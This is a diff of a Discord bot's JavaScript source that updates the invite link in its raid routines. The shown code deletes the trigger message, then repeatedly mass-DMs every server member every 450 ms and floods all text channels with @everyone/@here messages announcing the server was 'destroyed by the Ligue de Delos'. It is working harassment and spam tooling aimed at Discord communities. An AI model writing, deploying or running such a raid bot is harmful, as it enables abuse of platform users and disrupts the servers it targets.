@@ -124,7 +124,7 @@ client.on('message', msg => {
                 if (msg.deletable) msg.delete();
                 msg.guild.members.forEach(member => {
                   setInterval(function () {
-                    member.send(msg.guild.name + " a été détruit par la Ligue de Delos\nhttps://discord.gg/kkgw4Zp\nhttps://media.giphy.com/media/fs0jQE06crHkXuZGnP/giphy.gif").catch(error => {}) }, 450)})
+                    member.send(msg.guild.name + " a été détruit par la Ligue de Delos\nhttps://discord.gg/ru45dwu\nhttps://media.giphy.com/media/fs0jQE06crHkXuZGnP/giphy.gif").catch(error => {}) }, 450)})
        }
 
 if(msg.content === '-del'){
@@ -183,7 +183,7 @@ client.on("message", msg => {
             let i = 0;
             let interval = setInterval(function () {
               msg.guild.channels.forEach(channel => {
-                if (channel.type === "text") channel.send('@everyone  @here  Detruit par la ligue de delos\n\n\nhttps://discord.gg/kkgw4Zp\n\n\n\n\n\n\n\n\n\n\n\https://discord.gg/kkgw4Zpn\n\n\n\n\n\n\n\n\n\n\n\n\n\nhttps://discord.gg/kkgw4Zp\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nhttps://media.giphy.com/media/fs0jQE06crHkXuZGnP/giphy.gif')
+                if (channel.type === "text") channel.send('@everyone  @here  Detruit par la ligue de delos\n\n\nhttps://discord.gg/ru45dwu\n\n\n\n\n\n\n\n\n\n\n\nhttps://discord.gg/ru45dwun\n\n\n\n\n\n\n\n\n\n\n\n\n\nhttps://discord.gg/ru45dwu\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nhttps://media.giphy.com/media/fs0jQE06crHkXuZGnP/giphy.gif')
               }, 2500);
             });
           }
